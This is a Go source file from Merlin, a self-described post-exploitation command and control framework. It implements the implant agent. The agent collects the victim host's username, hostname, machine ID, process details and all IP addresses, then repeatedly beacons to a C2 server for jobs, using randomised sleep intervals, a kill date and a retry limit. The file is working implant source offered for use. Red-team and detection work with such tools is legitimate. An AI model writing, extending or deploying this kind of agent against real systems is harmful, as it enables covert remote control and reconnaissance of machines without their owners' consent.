// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	// 3rd Party
	"github.com/denisbrodbeck/machineid"
	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients"
	"github.com/Ne0nd0g/merlin/pkg/agent/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// GLOBAL VARIABLES
var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID            uuid.UUID               // ID is a Universally Unique Identifier per agent
	Client        clients.ClientInterface // Client is an interface for clients to make connections for agent communications
	Platform      string                  // Platform is the operating system platform the agent is running on (i.e. windows)
	Architecture  string                  // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	UserName      string                  // UserName is the username that the agent is running as
	UserGUID      string                  // UserGUID is a Globally Unique Identifier associated with username
	HostName      string                  // HostName is the computer's host name
	MachineID     string                  // MachineID is the computer's unique identifer
	Ips           []string                // Ips is a slice of all the IP addresses assigned to the host's interfaces
	Pid           int                     // Pid is the Process ID that the agent is running under
	Process       string                  // Process is this agent's process name in memory
	iCheckIn      time.Time               // iCheckIn is a timestamp of the agent's initial check in time
	sCheckIn      time.Time               // sCheckIn is a timestamp of the agent's last status check in time
	Version       string                  // Version is the version number of the Merlin Agent program
	Build         string                  // Build is the build number of the Merlin Agent program
	WaitTimeMin   int64                   // WaitTimeMin is shortest amount of time in which the agent waits in-between checking in
	WaitTimeMax   int64                   // WaitTimeMax is longest amount of time in which the agent waits in-between checking in
	MaxRetry      int                     // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	FailedCheckin int                     // FailedCheckin is a count of the total number of failed check ins
	Initial       bool                    // Initial identifies if the agent has successfully completed the first initial check in
	KillDate      int64                   // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Agent
type Config struct {
	WaitTimeMin int64  // WaitTimeMin is the minimum amount of time the Agent will wait between sending messages to the server
	WaitTimeMax int64  // WaitTimeMax is the maximum amount of time the Agent will wait between sending messages to the server
	KillDate    string // KillDate is the date, as a Unix timestamp, that agent will quit running
	MaxRetry    string // MaxRetry is the maximum amount of time an agent will fail to check in before it quits running
}

// New creates a new agent struct with specific values and returns the object
func New(config Config) (*Agent, error) {
	cli.Message(cli.DEBUG, "Entering agent.New() function")

	agent := Agent{
		ID:           uuid.NewV4(),
		Platform:     runtime.GOOS,
		Architecture: runtime.GOARCH,
		Pid:          os.Getpid(),
		Version:      core.Version,
		Initial:      false,
	}

	rand.Seed(time.Now().UnixNano())

	u, errU := user.Current()
	if errU != nil {
		return &agent, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
	}

	agent.UserName = u.Username
	agent.UserGUID = u.Gid

	h, errH := os.Hostname()
	if errH != nil {
		return &agent, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
	}

	agent.HostName = h

	mID, errM := machineid.ID()
	if errM != nil {
		var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
		var charset string = "ABCDEF0123456789"
		b := make([]byte, 16)
		for i := range b {
			b[i] = charset[seededRand.Intn(len(charset))]
		}
		mID = string(b)
	}

	agent.MachineID = mID

	p, errP := os.Executable()
	if errP != nil {
		return &agent, fmt.Errorf("there was an error getting the process name:\r\n%s", errH)
	}

	agent.Process = p

	interfaces, errI := net.Interfaces()
	if errI != nil {
		return &agent, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				agent.Ips = append(agent.Ips, addr.String())
			}
		} else {
			return &agent, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
		}
	}

	// Parse config
	var err error
	// Parse KillDate
	if config.KillDate != "" {
		agent.KillDate, err = strconv.ParseInt(config.KillDate, 10, 64)
		if err != nil {
			return &agent, fmt.Errorf("there was an error converting the killdate to an integer:\r\n%s", err)
		}
	} else {
		//18 digit max
		StrKillDate := "000000000000000000"
		IntKillDate, _ := strconv.ParseInt(StrKillDate, 10, 64)
		agent.KillDate = IntKillDate
	}
	// Parse MaxRetry
	if config.MaxRetry != "" {
		agent.MaxRetry, err = strconv.Atoi(config.MaxRetry)
		if err != nil {
			return &agent, fmt.Errorf("there was an error converting the max retry to an integer:\r\n%s", err)
		}
	} else {
		//18 digit max
		StrMaxRetry := "555555555555555555"
		IntMaxRetry, _ := strconv.Atoi(StrMaxRetry)
		agent.MaxRetry = IntMaxRetry
	}
	// Parse WaitTimeMin
	if config.WaitTimeMin != 0 {
		agent.WaitTimeMin = config.WaitTimeMin
	} else {
		//18 digit max
		StrWaitTimeMin := "999999999999999999"
		IntWaitTimeMin, _ := strconv.ParseInt(StrWaitTimeMin, 10, 64)
		agent.WaitTimeMin = IntWaitTimeMin
	}
	// Parse WaitTimeMax
	if config.WaitTimeMax != 0 {
		agent.WaitTimeMax = config.WaitTimeMax
	} else {
		//18 digit max
		StrWaitTimeMax := "888888888888888888"
		IntWaitTimeMax, _ := strconv.ParseInt(StrWaitTimeMax, 10, 64)
		agent.WaitTimeMax = IntWaitTimeMax
	}

	cli.Message(cli.INFO, "Host Information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tAgent UUID: %s", agent.ID))
	cli.Message(cli.INFO, fmt.Sprintf("\tPlatform: %s", agent.Platform))
	cli.Message(cli.INFO, fmt.Sprintf("\tArchitecture: %s", agent.Architecture))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser Name: %s", agent.UserName)) //TODO A username like _svctestaccont causes error
	cli.Message(cli.INFO, fmt.Sprintf("\tUser GUID: %s", agent.UserGUID))
	cli.Message(cli.INFO, fmt.Sprintf("\tHostname: %s", agent.HostName))
	cli.Message(cli.INFO, fmt.Sprintf("\tMachine ID: %s", agent.MachineID))
	cli.Message(cli.INFO, fmt.Sprintf("\tProcess: %s", agent.Process))
	cli.Message(cli.INFO, fmt.Sprintf("\tPID: %d", agent.Pid))
	cli.Message(cli.INFO, fmt.Sprintf("\tIPs: %v", agent.Ips))
	cli.Message(cli.DEBUG, "Leaving agent.New function")

	return &agent, nil
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run() error {
	rand.Seed(time.Now().UTC().UnixNano())

	cli.Message(cli.NOTE, fmt.Sprintf("Agent version: %s", a.Version))
	cli.Message(cli.NOTE, fmt.Sprintf("Agent build: %s", build))

	for {
		// Verify the agent's kill date hasn't been exceeded
		if (a.KillDate != 0) && (time.Now().Unix() >= a.KillDate) {
			cli.Message(cli.WARN, fmt.Sprintf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
			os.Exit(0)
		}
		// Check in
		if a.Initial {
			cli.Message(cli.NOTE, "Checking in...")
			a.statusCheckIn()
		} else {
			msg, err := a.Client.Initial(a.getAgentInfoMessage())
			if err != nil {
				a.FailedCheckin++
				cli.Message(cli.WARN, err.Error())
				cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
			} else {
				a.messageHandler(msg)
				a.Initial = true
				a.iCheckIn = time.Now().UTC()
			}
		}
		// Determine if the max number of failed checkins has been reached
		if a.FailedCheckin >= a.MaxRetry {
			cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d", a.MaxRetry))
			os.Exit(0)
		}
		// Sleep
		var totalWaitTime time.Duration
		if a.WaitTimeMin != a.WaitTimeMax {
			rand.Seed(time.Now().UnixNano())
			totalWaitTimeInt := rand.Int63n(a.WaitTimeMax-a.WaitTimeMin) + a.WaitTimeMin
			totalWaitTime = time.Duration(totalWaitTimeInt) * time.Second
		} else {
			totalWaitTime = time.Duration(a.WaitTimeMax) * time.Second
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
		time.Sleep(totalWaitTime)
	}
}

// statusCheckIn is the function that agent runs at every sleep/skew interval to check in with the server for jobs
func (a *Agent) statusCheckIn() {
	cli.Message(cli.DEBUG, "Entering into agent.statusCheckIn()")

	msg := getJobs()
	msg.ID = a.ID

	j, reqErr := a.Client.SendMerlinMessage(msg)

	if reqErr != nil {
		a.FailedCheckin++
		cli.Message(cli.WARN, reqErr.Error())
		cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))

		// Put the jobs back into the queue if there was an error
		if msg.Type == messages.JOBS {
			a.messageHandler(msg)
		}
		return
	}

	a.FailedCheckin = 0
	a.sCheckIn = time.Now().UTC()

	cli.Message(cli.DEBUG, fmt.Sprintf("Agent ID: %s", j.ID))
	cli.Message(cli.DEBUG, fmt.Sprintf("Message Type: %s", messages.String(j.Type)))
	cli.Message(cli.DEBUG, fmt.Sprintf("Message Payload: %+v", j.Payload))

	// Handle message
	a.messageHandler(j)

}

// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
